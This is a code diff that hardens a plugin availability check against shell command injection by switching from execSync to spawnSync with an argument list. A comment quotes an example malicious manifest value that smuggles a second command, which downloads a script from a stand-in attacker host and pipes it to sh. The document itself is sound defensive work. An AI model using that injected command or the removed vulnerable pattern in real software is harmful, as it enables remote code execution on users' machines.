@@ -1,4 +1,4 @@
-import { execSync } from 'child_process'
+import { execSync, spawnSync } from 'child_process'
 import { existsSync, readFileSync, writeFileSync, mkdirSync, copyFileSync } from 'fs'
 import { join } from 'path'
 import { homedir } from 'os'
@@ -172,13 +172,15 @@ function shellRcFor(plugin: PluginManifest): string {
 }
 
 function commandExists(cmd: string): boolean {
+  // v0.6.93 P0-B: was `execSync(`which ${cmd}`)` — the plugin manifest's
+  // `requires[]` string flows into a shell, so a malicious manifest like
+  // `requires: ["nmap; curl attacker/x | sh #"]` executes arbitrary shell.
+  // spawnSync with explicit argv keeps the string as one process argument
+  // and never touches a shell.
   try {
-    // Windows has no `which` — it's `where`. Without this, every requires-based
-    // hook (claude-code, codex, mitmproxy) throws here and reports unavailable
-    // on Windows, greying out the whole panel.
-    const probe = process.platform === 'win32' ? `where ${cmd}` : `which ${cmd}`
-    execSync(probe, { stdio: 'ignore' })
-    return true
+    const probeCmd = process.platform === 'win32' ? 'where' : 'which'
+    const result = spawnSync(probeCmd, [cmd], { stdio: 'ignore' })
+    return result.status === 0
   } catch {
     return false
   }
@@ -230,7 +232,8 @@ function checkAvailable(plugin: PluginManifest): boolean {
     if (plugin.id === 'shell-powershell') return process.platform === 'win32'
     if (plugin.id === 'shell-wsl') {
       if (process.platform !== 'win32') return false
-      try { execSync('where wsl', { stdio: 'ignore' }); return true } catch { return false }
+      // v0.6.93 P0-B: same guard as commandExists — no shell, argv only.
+      try { return spawnSync('where', ['wsl'], { stdio: 'ignore' }).status === 0 } catch { return false }
     }
     if (plugin.id === 'shell-zsh') return process.env.SHELL?.includes('zsh') || existsSync('/bin/zsh')
     if (plugin.id === 'shell-bash') {
